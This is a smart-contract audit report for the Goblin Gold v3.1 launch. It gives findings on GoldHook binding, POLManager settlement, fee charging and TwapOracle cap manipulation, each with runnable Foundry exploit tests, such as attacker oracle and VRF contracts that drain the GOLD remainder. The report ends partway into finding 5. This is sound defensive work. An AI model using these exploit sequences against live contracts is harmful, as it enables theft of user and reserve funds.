# Audit report

> X: https://x.com/imdplace
> Pre-launch audit of Goblin Gold v3.1 at commit 64a3c2ff8518d95299317c89f03a89c3e9381592 (Ethereum mainnet). GoblinNFT is already deployed at 0xC5d5F314da6d4a433F9BF897a2cC24A537576cB1 and must not change; review it only as an integration point.
>
> Act exactly like the IMD launch panel (flow, permissions, economics, math, judge) for the two remaining launches and report everything it would raise:
> - Launch 1: genesis token + GoldHook (univ4_hook, paired with ETH, fee 12500, tick 60): TWAP ring, 1% hook fee split 50/50 NFT holders / gacha reserve, 90/50/25% launch tax, 0.5 ETH max buy in the first hour, ERC6909 claim accounting, flush, one-time bindGacha pinned to the BagGacha runtime hash, remainder custody (remainderTo GoldHook or the paying wallet).
> - Launch 2: TwapOracle, GenesisVault, BagGacha, Curator, POLManager with $contract references, then setLaunchTargets on the NFT.
> Priorities: GoldHook v4 delta handling and fee accounting (no fee on unconsumed input, no stuck ETH, no reentrancy through flush), observation ring correctness and manipulation cost at the 1 ETH genesis depth, the 5% payout cap and Bag splitting, POLManager v4 unlock settlement, VRF request/callback safety, Curator attestation and bounds, Genesis schedule and dividends, and every path that moves user or reserve funds.
>
> Deliver for every finding: severity, contract and line, a runnable Foundry reproduction, whether a launch judge would block it, and for medium or higher the minimal fix. If nothing blocks, say so explicitly per launch. Do not change source.

| | |
|---|---|
| Repository | https://github.com/identity-md-launches/launch-1545-goblin-gold.git |
| Commit | `64a3c2ff8518d95299317c89f03a89c3e9381592` |
| Job | `85083c05-6dca-432c-85a9-4969c58c6303` |
| Judged | 2026-10-14 05:23 UTC |
| Findings | 1 critical · 3 high · 2 medium · 3 low · 1 info |

Four agents audited the code as it is at `64a3c2f`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. Critical: bindGacha accepts any look-alike BagGacha: only the runtime code hash, nft() and genesis().token() are pinned, so the first caller binds an attacker-wired gacha, takes the GOLD remainder and the reser

`src/GoldHook.sol:257`

```
        if (gacha_.codehash != gachaRuntimeCodeHash()) revert CodeMismatch();
```

GoldHook.bindGacha (src/GoldHook.sol:255-265) is permissionless and one-time, and the hook has no owner. It accepts a candidate when its runtime code hash equals GACHA_RUNTIME_CODE_HASH, gacha.nft() == GoblinNFT and gacha.genesis().token() == GOLD. BagGacha deliberately keeps every wiring word (oracle, genesis, nft, vrf, polManager, team, curator, startTime) in storage with no immutables (src/BagGacha.sol:84) so that every deployment shares one runtime code, and GenesisVault's code is not checked at all. Anyone can therefore deploy GenesisVault(token=GOLD, oracle=<attacker>, gacha=<predicted attacker gacha>, startTime in the past, ...) and BagGacha(oracle=<attacker>, genesis=<that vault>, nft=GoblinNFT, vrf=<attacker>, polManager=<attacker>, team=<attacker>, curator=<attacker>) from the published source and bind it in the same block as launch 1, before launch 2 exists, or by front-running the honest bind. Effects: (a) under remainder path B the whole GOLD launch remainder held by the hook is safeTransferred to the attacker's vault at line 264, and the attacker's oracle/VRF let their gacha emit it to themselves through spin/draw/keep/claim; (b) under both paths reserveAccrued (50% of the 1% hook fee plus 100% of the 90/50/25% launch tax) is flushed to the attacker gacha's fundReserve() forever; (c) the real BagGacha can never be bound (AlreadyBound). Merged from audit_flow, audit_permissions and audit_economics (same root cause, same line). Launch judge: blocks launch 1 (the hook is immutable once deployed). Minimal fix preserving the no-owner design: bind only the gacha the NFT owner named through the holder-reviewed setLaunchTargets, e.g. require IGoblinNFT(NFT).reserveTarget() == gacha_ (and vrfTarget() == gacha_), reordering the runbook so setLaunchTargets precedes bindGacha; or restrict bindGacha to a binder address fixed in the constructor (factory). Pinning more getters (vrf, oracle, polManager) is not sufficient because team, curator, startTime and the vault's oracle remain free.

**Reproduction**

State: GoldHook deployed (any poolManager/factory, token = GOLD), holding 500,000,000 GOLD (path B), gacha() == 0. Attacker (no privileges, 1 ETH) deploys AttackerOracle (tokensForEth = 1e30, valueAndCap = (0.01 ETH, max)), AttackerVRF (price 0, requestId 1, fulfils on demand), GenesisVault(GOLD, attackerOracle, predictedGacha, now-3d, 5e26, 1e25, attacker) and BagGacha(attackerOracle, fakeVault, 0xC5d5F314da6d4a433F9BF897a2cC24A537576cB1, attackerVRF, attacker, attacker, now-3d, attacker). Expected: hook.bindGacha(fakeGacha) reverts. Actual: it succeeds, gold.balanceOf(fakeVault) == 5e26, then fundReserve(0.05 ETH), spin(0.01 ETH), AttackerVRF.fulfill, draw(), choose(keep), fakeVault.claim() move GOLD to the attacker; a later bindGacha(realGacha) reverts AlreadyBound. Run: forge test --match-path test/scratch/BindGachaLookalike.t.sol (fails on this code with 'bindGacha accepted a look-alike BagGacha...'). The test resolves the pinned hash to keccak256(type(BagGacha).runtimeCode) through the virtual gachaRuntimeCodeHash() so it holds under both compile profiles; under the launch profile the attacker's deployment matches the hard-coded hash identically.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {GoldHook} from "src/GoldHook.sol";
import {BagGacha} from "src/BagGacha.sol";
import {GenesisVault} from "src/GenesisVault.sol";

/// @dev Minimal ERC20 standing in for the launch-1 GOLD token.
contract Gold {
    string public name = "GOLD";
    string public symbol = "GOLD";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
        totalSupply += a;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a;
        balanceOf[f] -= a;
        balanceOf[to] += a;
        return true;
    }
}

/// @dev The attacker's price oracle: whatever the attacker wants GOLD to be worth.
contract AttackerOracle {
    function isPriced(address) external pure returns (bool) {
        return true;
    }

    function valueInEth(address, uint256) external pure returns (uint256) {
        return 0.01 ether;
    }

    function valueAndCap(address, uint256) external pure returns (uint256, uint256) {
        return (0.01 ether, type(uint256).max);
    }

    function tokensForEth(address, uint256) external pure returns (uint256) {
        return 1e30;
    }
}

interface IConsumer {
    function rawFulfillRandomWords(uint256 requestId, uint256[] memory randomWords) external;
}

/// @dev The attacker's "VRF wrapper": it fulfils with any word the attacker likes.
contract AttackerVRF {
    function calculateRequestPriceNative(uint32, uint32) external pure returns (uint256) {
        return 0;
    }

    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata) external payable returns (uint256) {
        return 1;
    }

    function fulfill(address consumer, uint256 word) external {
        uint256[] memory w = new uint256[](1);
        w[0] = word;
        IConsumer(consumer).rawFulfillRandomWords(1, w);
    }
}

/// @dev GoldHook with the pinned hash resolved to the runtime code of the BagGacha compiled under this profile, so the
///      test holds under both the via_ir and the imported-launch profile. Nothing else differs from GoldHook.
contract GoldHookPinnedHere is GoldHook {
    constructor(address pm, address token_, address factory_) GoldHook(pm, token_, factory_) {}

    function gachaRuntimeCodeHash() public pure override returns (bytes32) {
        return keccak256(type(BagGacha).runtimeCode);
    }
}

/// @notice GoldHook.bindGacha accepts ANY BagGacha whose runtime code matches, whose `nft()` is GoblinNFT and whose
///         `genesis().token()` is GOLD. Every other wiring word of that gacha (oracle, VRF wrapper, POL manager, team,
///         curator, startTime) and the whole GenesisVault (its oracle, gacha, supply, curator) are attacker-chosen. The
///         first caller after launch 1 therefore binds a look-alike gacha: the GOLD remainder parked in the hook is
///         forwarded to the attacker's vault and the reserve share of all hook fees and launch tax is theirs forever.
contract BindGachaLookalikeTest is Test {
    address constant NFT = 0xC5d5F314da6d4a433F9BF897a2cC24A537576cB1;
    address attacker = address(0xBAD);
    uint256 constant REMAINDER = 500_000_000e18;

    Gold gold;
    GoldHookPinnedHere hook;

    function setUp() public {
        vm.warp(1_800_000_000);
        gold = new Gold();
        // launch 1: hook deployed by the factory; path B parks the token remainder in the hook
        hook = new GoldHookPinnedHere(address(0xBEEF), address(gold), address(0xFAC7));
        gold.mint(address(hook), REMAINDER);
        vm.deal(attacker, 1 ether);
    }

    function testLookalikeGachaCannotBindAndDrainRemainder() public {
        // --- attacker deploys a GenesisVault + BagGacha from the very same source, with their own wiring
        vm.startPrank(attacker);
        AttackerOracle oracle = new AttackerOracle();
        AttackerVRF vrf = new AttackerVRF();
        uint256 start = block.timestamp - 3 days;
        address predictedGacha = vm.computeCreateAddress(attacker, vm.getNonce(attacker) + 1);
        GenesisVault fakeVault = new GenesisVault(
            address(gold), address(oracle), predictedGacha, start, REMAINDER, REMAINDER / 50, attacker
        );
        BagGacha fakeGacha = new BagGacha(
            address(oracle), address(fakeVault), NFT, address(vrf), attacker, attacker, start, attacker
        );
        assertEq(address(fakeGacha), predictedGacha);
        assertEq(address(fakeGacha).codehash, hook.gachaRuntimeCodeHash(), "same runtime code as the real gacha");

        // --- the hook accepts it: this is the defect
        (bool bound,) = address(hook).call(abi.encodeCall(GoldHook.bindGacha, (address(fakeGacha))));

        uint256 stolen;
        if (bound) {
            // the whole launch remainder now sits in the attacker's vault ...
            assertEq(gold.balanceOf(address(fakeVault)), REMAINDER);
            // ... and leaves through the attacker-controlled gacha: fund, spin, self-fulfil, draw, keep, claim
            fakeGacha.fundReserve{value: 0.05 ether}();
            fakeGacha.spin{value: 0.01 ether}();
            vrf.fulfill(address(fakeGacha), 12345);
            uint256 alloc = fakeGacha.draw();
            fakeGacha.choose(alloc, true);
            fakeVault.claim();
            stolen = gold.balanceOf(attacker);
        }
        vm.stopPrank();

        assertFalse(bound, "bindGacha accepted a look-alike BagGacha with attacker-controlled oracle, VRF and vault");
        assertEq(gold.balanceOf(address(hook)), REMAINDER, "launch remainder left the hook");
        assertEq(stolen, 0, "attacker claimed GOLD out of the remainder");
    }
}
```

### 2. High: POLManager._addFullRange never settles a positive (fee) delta on its single position: once the position's unclaimed ETH or GOLD fees exceed the add's principal, every addLiquidity reverts CurrencyNotS

`src/POLManager.sol:197`

```
        uint256 ethUsed = a0 < 0 ? uint256(uint128(-a0)) : 0;
```

All POL adds go to one position (TICK_LOWER, TICK_UPPER, salt 0). The v4 PoolManager returns callerDelta = principalDelta + feesAccrued from modifyLiquidity (test/v4-core/PoolManager.sol:170) and accounts that net delta to POLManager. _addFullRange treats a positive a0 or a1 as 'nothing used' (lines 197-198), settles nothing and never calls poolManager.take, so a positive currency delta is left open and PoolManager.unlock reverts CurrencyNotSettled. addLiquidity caps ethIn at 2 ETH, so the ETH principal of a call is at most 1 ETH: as soon as the position's unclaimed currency0 fees (1.25% LP fee on the POL share of ETH volume since the previous add) exceed that, no add can ever succeed again; the same holds for the GOLD side when accrued GOLD fees exceed the tokens bought. polBudget (50% of the ~10 ETH mint escrow plus the POL share of every spin) can then never be deployed; buyAndBurn is unaffected. No owner or rescue path exists. Launch judge: blocks launch 2 (settlement defect on a permissionless fund-moving path, funds stuck). Minimal fix: in _addFullRange, when a0 > 0 call poolManager.take(address(0), address(this), uint256(uint128(a0))) and when a1 > 0 call poolManager.take(token, address(this), uint256(uint128(a1))), so the callback always zeroes both deltas; the taken ETH is recycled by recycle() and the GOLD joins the next add.

**Reproduction**

State (test/scratch/PolFeeBrick.t.sol, vendored v4 PoolManager): pool initialized by the factory at 1:1, 0.001 ETH seed liquidity, POLManager with a permissive oracle; pol.depositPOL(1 ETH); pol.addLiquidity(0.02 ether) succeeds. Then 60 rounds of buy 0.02 ETH / sell for 0.0185 ETH generate ETH-side LP fees on the POL position larger than 0.01 ETH. Input: pol.addLiquidity(0.02 ether). Expected: liquidity added (fees taken or rolled in). Actual: modifyLiquidity returns a positive amount0 (fees minus principal), ethUsed is set to 0, nothing is taken, PoolManager reverts CurrencyNotSettled(); every later addLiquidity reverts the same way. Run: forge test --match-path test/scratch/PolFeeBrick.t.sol (fails on this code with CurrencyNotSettled()).

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "../v4-core/PoolManager.sol";
import {IPoolManager} from "../v4-core/interfaces/IPoolManager.sol";
import {IHooks} from "../v4-core/interfaces/IHooks.sol";
import {Currency} from "../v4-core/types/Currency.sol";
import {PoolKey as CoreKey} from "../v4-core/types/PoolKey.sol";
import {SwapParams as CoreSwap, ModifyLiquidityParams as CoreModify} from "../v4-core/types/PoolOperation.sol";
import {PoolSwapTest} from "../v4-core/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "../v4-core/test/PoolModifyLiquidityTest.sol";
import {GoldHook} from "src/GoldHook.sol";
import {POLManager} from "src/POLManager.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Gold2 is ERC20 {
    constructor() ERC20("GOLD", "GOLD") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

contract LooseOracle {
    function tokensForEth(address, uint256) external pure returns (uint256) {
        return 1; // minOut ~ 0 so price impact never trips Slippage
    }
}

/// @dev Proof: once the POL position's unclaimed ETH fees exceed the ETH half of an add, addLiquidity reverts forever.
contract PolFeeBrickTest is Test {
    uint160 constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    address constant HOOK_ADDRESS = address((uint160(0x4A) << 152) | 0x30CC);
    address factoryEOA = address(0xFAC7);
    address trader = address(0x7A4D);

    PoolManager manager;
    Gold2 gold;
    GoldHook hook;
    POLManager pol;
    PoolSwapTest swapRouter;
    PoolModifyLiquidityTest lpRouter;
    CoreKey key;

    receive() external payable {}

    function setUp() public {
        vm.warp(1_800_000_000);
        manager = new PoolManager(address(this));
        gold = new Gold2();
        GoldHook impl = new GoldHook(address(manager), address(gold), factoryEOA);
        vm.etch(HOOK_ADDRESS, address(impl).code);
        hook = GoldHook(payable(HOOK_ADDRESS));
        swapRouter = new PoolSwapTest(IPoolManager(address(manager)));
        lpRouter = new PoolModifyLiquidityTest(IPoolManager(address(manager)));
        key = CoreKey(Currency.wrap(address(0)), Currency.wrap(address(gold)), 12500, 60, IHooks(HOOK_ADDRESS));
        vm.deal(trader, 1000 ether);
        vm.deal(address(this), 10_000 ether);
        vm.prank(factoryEOA);
        manager.initialize(key, SQRT_PRICE_1_1);
        gold.mint(address(this), 100 ether);
        gold.approve(address(lpRouter), 100 ether);
        // tiny seed so the POL position dominates the fee share
        lpRouter.modifyLiquidity{value: 0.001 ether}(key, CoreModify(-887220, 887220, 1e15, bytes32(0)), "");
        vm.warp(block.timestamp + 2 hours); // past tax + early-buy window
        pol = new POLManager(address(manager), address(gold), HOOK_ADDRESS, address(new LooseOracle()), address(0xE5C));
        gold.mint(trader, 1_000_000 ether);
        vm.prank(trader);
        gold.approve(address(swapRouter), type(uint256).max);
    }

    function _buy(uint256 ethIn) internal {
        vm.prank(trader);
        swapRouter.swap{value: ethIn}(
            key, CoreSwap(true, -int256(ethIn), 4295128739 + 1), PoolSwapTest.TestSettings(false, false), ""
        );
    }

    function _sellForEth(uint256 ethOut) internal {
        vm.prank(trader);
        swapRouter.swap(
            key,
            CoreSwap(false, int256(ethOut), 1461446703485210103287273052203988822378723970342 - 1),
            PoolSwapTest.TestSettings(false, false),
            ""
        );
    }

    function testAddLiquidityKeepsWorkingOnceFeesExceedPrincipal() public {
        pol.depositPOL{value: 1 ether}();
        uint128 liq = pol.addLiquidity(0.02 ether);
        assertGt(liq, 0);
        // generate ETH-side LP fees on the pool: 60 buys of 0.02 ETH with sells in between
        for (uint256 i = 0; i < 60; ++i) {
            _buy(0.02 ether);
            _sellForEth(0.0185 ether);
        }
        // Expected: the position's accrued fees are settled (taken or rolled in) and the add succeeds for any
        // allowed size. Actual: callerDelta.amount0() = fees - principal > 0 is neither taken nor settled, the
        // PoolManager reverts CurrencyNotSettled, and every later addLiquidity reverts the same way.
        uint128 liq2 = pol.addLiquidity(0.02 ether);
        assertGt(liq2, 0, "addLiquidity must keep working once fees exceed the add's principal");
    }
}
```

### 3. High: GoldHook charges the 1% hook fee and the launch tax on the full specified ETH amount of exact-input buys and exact-output sells, even when the pool consumes only part of it (price-limit partial fill)

`src/GoldHook.sol:207`

```
            (uint256 fee, uint256 tax) = _specifiedCharge(params);
```

When ETH is the specified currency (exact-input buy, exact-output sell) beforeSwap computes fee + tax from params.amountSpecified through _specifiedCharge (line 384-391) and returns it as the specified BeforeSwapDelta; afterSwap re-derives the same figure from params (line 224) and mints it, never looking at swapDelta.amount0, i.e. at how much ETH the pool actually consumed or delivered. A v4 swap that reaches sqrtPriceLimitX96 stops early and leaves the rest of the input with the swapper, but the hook's charge was already fixed on the whole amount, so the swapper pays fee (and in the first 30 minutes tax) on ETH that never traded. This is the brief's 'no fee on unconsumed input' requirement failing and a loss of user funds under an ordinary router input (any integration that passes a real price limit for slippage protection: direct PoolManager integrations, PoolSwapTest-style routers, split routes, limit orders); the v4 periphery's MIN/MAX limits are unaffected. Merged from audit_flow, audit_permissions, audit_math and audit_economics (same root cause). Launch judge: raises it under fee accounting; with the 90% tax window it is a 455x overcharge on a user swap, so treated as blocking for launch 1 until fixed or the partial-fill case is rejected. Minimal fix: in afterSwap, for the _specifiedIsEth branch, compare the pool's realised ETH leg (uint256(uint128(-V4Lib.amount0(swapDelta))) for an exact-input buy, uint256(uint128(V4Lib.amount0(swapDelta))) for an exact-output sell) with amount - fee - tax (buy) / amount (sell) and revert with a PartialFill error when they differ. The specified-side charge cannot be refunded from afterSwap (only the unspecified delta is returnable), so rejecting the partial fill is the smallest correct change.

**Reproduction**

Real vendored PoolManager, pool initialized by the factory at 1:1, 100 ETH / 100 GOLD full-range liquidity. (1) Two hours after launch (no tax): exact-input buy of 10 ETH with sqrtPriceLimitX96 = spot * 0.9999. Expected: fee <= 1% of the ETH consumed (about 0.0001 ETH on 0.0101 ETH). Actual: swapper amount0 = -110127595037984813 wei, hook minted 100000000000000000 wei (0.1 ETH, holderAccrued 0.05 + reserveAccrued 0.05) while the pool consumed 10127595037984813 wei; GOLD out 0.01. (2) At launch (90% tax): exact-input buy of 0.5 ETH with limit spot * 0.99999. Actual: ETH spent 456012668354531648, fee+tax minted 455000000000000000, GOLD out 1000000000000000 (0.001 GOLD). Run: forge test --match-path test/scratch/PartialFillFee.t.sol (fails on this code with 'hook fee charged on ETH the pool never consumed: 100000000000000000 > 101275950379849').

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "../v4-core/PoolManager.sol";
import {IPoolManager} from "../v4-core/interfaces/IPoolManager.sol";
import {IHooks} from "../v4-core/interfaces/IHooks.sol";
import {Currency} from "../v4-core/types/Currency.sol";
import {PoolKey as CoreKey} from "../v4-core/types/PoolKey.sol";
import {SwapParams as CoreSwap, ModifyLiquidityParams as CoreModify} from "../v4-core/types/PoolOperation.sol";
import {PoolSwapTest} from "../v4-core/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "../v4-core/test/PoolModifyLiquidityTest.sol";
import {GoldHook} from "src/GoldHook.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract GoldPF is ERC20 {
    constructor() ERC20("GOLD", "GOLD") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

/// @notice GoldHook charges the 1% hook fee (and launch tax) on the whole specified ETH input of an exact-input buy
///         even when the swap stops at `sqrtPriceLimitX96` and the pool consumes only a fraction of it. Expected:
///         the charge is bounded by 1% (+ tax) of the ETH the pool actually consumed, or the partial fill reverts.
contract PartialFillFeeTest is Test {
    uint160 constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    address constant HOOK_ADDRESS = address((uint160(0x4A) << 152) | 0x30CC);
    address factoryEOA = address(0xFAC7);
    address trader = address(0x7A4D);

    PoolManager manager;
    GoldPF gold;
    GoldHook hook;
    PoolSwapTest swapRouter;
    PoolModifyLiquidityTest lpRouter;
    CoreKey key;

    receive() external payable {}

    function setUp() public {
        vm.warp(1_800_000_000);
        manager = new PoolManager(address(this));
        gold = new GoldPF();
        GoldHook impl = new GoldHook(address(manager), address(gold), factoryEOA);
        vm.etch(HOOK_ADDRESS, address(impl).code);
        hook = GoldHook(payable(HOOK_ADDRESS));
        swapRouter = new PoolSwapTest(IPoolManager(address(manager)));
        lpRouter = new PoolModifyLiquidityTest(IPoolManager(address(manager)));
        key = CoreKey(Currency.wrap(address(0)), Currency.wrap(address(gold)), 12500, 60, IHooks(HOOK_ADDRESS));
        vm.deal(trader, 100 ether);
        vm.deal(address(this), 1000 ether);
        vm.prank(factoryEOA);
        manager.initialize(key, SQRT_PRICE_1_1);
        gold.mint(address(this), 100 ether);
        gold.approve(address(lpRouter), 100 ether);
        lpRouter.modifyLiquidity{value: 100 ether}(key, CoreModify(-887220, 887220, 100e18, bytes32(0)), "");
        vm.warp(block.timestamp + 2 hours); // tax window and early-buy window are over: only the 1% fee applies
    }

    function testFeeOnlyOnConsumedInput() public {
        // exact-input buy of 10 ETH with a price limit 0.01% under spot: the pool can only consume ~0.01 ETH
        uint160 limit = uint160((uint256(SQRT_PRICE_1_1) * 9999) / 10000);
        uint256 ethBefore = trader.balance;
        vm.prank(trader);
        try swapRouter.swap{value: 10 ether}(
            key, CoreSwap(true, -10 ether, limit), PoolSwapTest.TestSettings(false, false), ""
        ) {
            uint256 spent = ethBefore - trader.balance;
            uint256 charged = hook.holderAccrued() + hook.reserveAccrued();
            uint256 consumed = spent - charged;
            // Expected: fee <= 1% of what the pool consumed (+1 wei rounding).
            // Actual on this code: charged = 0.1 ETH (1% of 10 ETH) while the pool consumed ~0.0101 ETH.
            assertLe(charged, consumed / 100 + 1, "hook fee charged on ETH the pool never consumed");
        } catch {
            // a hook that rejects partial fills instead of over-charging also satisfies the requirement
        }
    }
}
```

### 4. High: Genesis depth and the 5% payout cap are read from the pool's instantaneous active liquidity: a narrow or same-transaction JIT position inflates the cap ~1000x for ~3 ETH that is fully returned, and 3

`src/TwapOracle.sol:208`

```
        ethSide = Math.mulDiv(liquidity, 1 << 96, sqrtPrice);
```

_checkGenesisPool derives ethSide = L * 2^96 / sqrtP from goldHook.liquidity() and the spot price, and _valueAndCap turns it into cap = ethSide * 500 / 10000 (line 156). L is the current in-range liquidity with no time weighting and no bound by what the position actually holds (the v3 path bounds by the pool's WETH balance, line 227; the v4 path has no such bound). Liquidity concentrated in the single 60-tick spacing range around spot needs about 0.3% of its full-range notional on each side, so L = 1e21 (1000x the 1 ETH genesis depth) costs about 3 ETH + 3 GOLD and is returned in full when removed in the same transaction. BagGacha commits oracle.valueAndCap at spin-request time (_buildSnapshot / _commitGenesis, src/BagGacha.sol:553-571 and 585+) and draw() pays the committed values, so a bundle [add JIT liquidity, spin(), remove] snapshots the inventory against a cap of ~50 ETH instead of 0.05 ETH: the per-draw extraction bound that v3.1 introduces as its safeguard for the 1 ETH genesis depth (README, report.md) is switched off by the party it is meant to bound, and a GOLD Bag whose TWAP value was pushed is bought back from the reserve at 88% of the inflated value / the Genesis quote is uncapped. The same add also satisfies MIN_GENESIS_DEPTH for a pool that really holds less than 1 ETH. Merged from audit_flow (narrow-range depth inflation), audit_math and audit_economics (JIT cap); one root cause at this line. Launch judge: blocks launch 2 under economics, since the cap is the control the v3.1 design relies on; the depth bound is not a liveness guarantee on its own. Minimal fix: make the depth something one transaction cannot move, e.g. record the active liquidity in each GoldHook observation (as v3 records secondsPerLiquidityCumulative) and let TwapOracle use min(current L, L at the 30-minute observation); or bound ethSide by the ETH the active liquidity would hold down to the lowest usable tick (SqrtPriceMath.getAmount0Delta(sqrtP, sqrtPriceAtTick(-887220), L)), which equals the virtual reserve for the POL full-range positions and is small for narrow ones.

**Reproduction**

Real vendored PoolManager, pool at 1:1 with 1e18 full-range liquidity (1 ETH ETH-side depth), 5 hours of ring history, fresh observation. payoutCap(GOLD) = 50000048881249999 wei (0.05 ETH). In one transaction: lpRouter.modifyLiquidity(key, {tickLower:-60, tickUpper:60, liquidityDelta:+1e21}) posts 2996332580910780938 wei ETH and 2994377331866530644 wei GOLD; payoutCap(GOLD) = 50050048930131249999 wei (50.05 ETH); modifyLiquidity(-1e21) returns everything (net ETH cost 1 wei) and payoutCap(GOLD) = 50000048881249999 again. Separately, a pool seeded with only 0.5 ETH / 0.5 GOLD (payoutCap reverts ThinPool) passes MIN_GENESIS_DEPTH after a +1e18 position in [-60, 60] costing 2997310205910781 wei (0.003 ETH): payoutCap = 75000146643749999 wei. Expected: a cap/depth that transient or narrow liquidity cannot raise beyond the ETH it actually posts. Run: forge test --match-path test/scratch/JitPayoutCap.t.sol (fails on this code with 'transient narrow liquidity inflates the cap: 50050048930131249999 > 349633306972328092').

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "../v4-core/PoolManager.sol";
import {IPoolManager} from "../v4-core/interfaces/IPoolManager.sol";
import {IHooks} from "../v4-core/interfaces/IHooks.sol";
import {Currency} from "../v4-core/types/Currency.sol";
import {PoolKey as CoreKey} from "../v4-core/types/PoolKey.sol";
import {SwapParams as CoreSwap, ModifyLiquidityParams as CoreModify} from "../v4-core/types/PoolOperation.sol";
import {PoolSwapTest} from "../v4-core/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "../v4-core/test/PoolModifyLiquidityTest.sol";
import {GoldHook} from "src/GoldHook.sol";
import {TwapOracle} from "src/TwapOracle.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract GoldJIT is ERC20 {
    constructor() ERC20("GOLD", "GOLD") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

/// @notice TwapOracle derives the genesis depth and the 5% payout cap from the pool's instantaneous active liquidity
///         (`L * 2^96 / sqrtP`). A single-tick-spacing position around spot is ~1000x cheaper per unit of L than the
///         full-range liquidity the number is meant to measure, and it can be added and removed in the same
///         transaction. Expected: a transient add of ~3 ETH cannot raise the cap by more than the ETH it posts.
///         Actual: cap goes from 0.05 ETH to 50.05 ETH and back, with all ~3 ETH / 3 GOLD returned.
contract JitPayoutCapTest is Test {
    uint160 constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    address constant HOOK_ADDRESS = address((uint160(0x4A) << 152) | 0x30CC);
    address factoryEOA = address(0xFAC7);
    address trader = address(0x7A4D);

    PoolManager manager;
    GoldJIT gold;
    GoldHook hook;
    TwapOracle oracle;
    PoolSwapTest swapRouter;
    PoolModifyLiquidityTest lpRouter;
    CoreKey key;

    receive() external payable {}

    function setUp() public {
        vm.warp(1_800_000_000);
        manager = new PoolManager(address(this));
        gold = new GoldJIT();
        GoldHook impl = new GoldHook(address(manager), address(gold), factoryEOA);
        vm.etch(HOOK_ADDRESS, address(impl).code);
        hook = GoldHook(payable(HOOK_ADDRESS));
        oracle = new TwapOracle(address(0xC0), address(0xE0), address(0xF0), address(gold), HOOK_ADDRESS);
        swapRouter = new PoolSwapTest(IPoolManager(address(manager)));
        lpRouter = new PoolModifyLiquidityTest(IPoolManager(address(manager)));
        key = CoreKey(Currency.wrap(address(0)), Currency.wrap(address(gold)), 12500, 60, IHooks(HOOK_ADDRESS));
        vm.deal(trader, 10 ether);
        vm.deal(address(this), 1000 ether);
        vm.prank(factoryEOA);
        manager.initialize(key, SQRT_PRICE_1_1);
        // genesis pool at the design minimum: 1 ETH of ETH-side depth, full range
        gold.mint(address(this), 1000 ether);
        gold.approve(address(lpRouter), type(uint256).max);
        lpRouter.modifyLiquidity{value: 1 ether}(key, CoreModify(-887220, 887220, 1e18, bytes32(0)), "");
        // 5 hours of ring history and a fresh observation
        vm.warp(block.timestamp + 5 hours);
        vm.prank(trader);
        swapRouter.swap{value: 1e12}(
            key, CoreSwap(true, -1e12, 4295128739 + 1), PoolSwapTest.TestSettings(false, false), ""
        );
    }

    function testTransientNarrowLiquidityCannotInflateCap() public {
        uint256 capBefore = oracle.payoutCap(address(gold));
        assertApproxEqRel(capBefore, 0.05 ether, 1e15, "cap at 1 ETH depth is 0.05 ETH");

        uint256 ethBefore = address(this).balance;
        // same transaction: add L = 1e21 in the single spacing range around spot ...
        lpRouter.modifyLiquidity{value: 10 ether}(key, CoreModify(-60, 60, 1e21, bytes32(0)), "");
        uint256 posted = ethBefore - address(this).balance;
        uint256 capDuring = oracle.payoutCap(address(gold));
        // ... and remove it again
        lpRouter.modifyLiquidity(key, CoreModify(-60, 60, -1e21, bytes32(0)), "");
        uint256 capAfter = oracle.payoutCap(address(gold));

        assertLt(posted, 3.1 ether, "position costs about 3 ETH");
        assertApproxEqRel(capAfter, capBefore, 1e15, "cap is back once the JIT liquidity leaves");
        // Expected: at most 5% of the ETH actually posted is added to the cap (2x tolerance).
        // Actual: capDuring ~ 50.05 ETH, i.e. 1000x the pool's durable depth.
        assertLe(capDuring, capBefore + (posted * 500 * 2) / 10_000, "transient narrow liquidity inflates the cap");
    }
}
```

### 5. Medium: Genesis quote prices GOLD at the lower of the 30-minute and 4-hour TWAPs, so a 30-minute push on the 1-2 ETH-deep pool multiplies every Genesis Bag ~4x for ~0.067 ETH of round-trip cost, and the 5% ca

`src/TwapOracle.sol:166`

```
                Math.max(_quoteAtTick(s, ethAmount, address(0), token), _quoteAtTick(l, ethAmount, address(0), token));
```

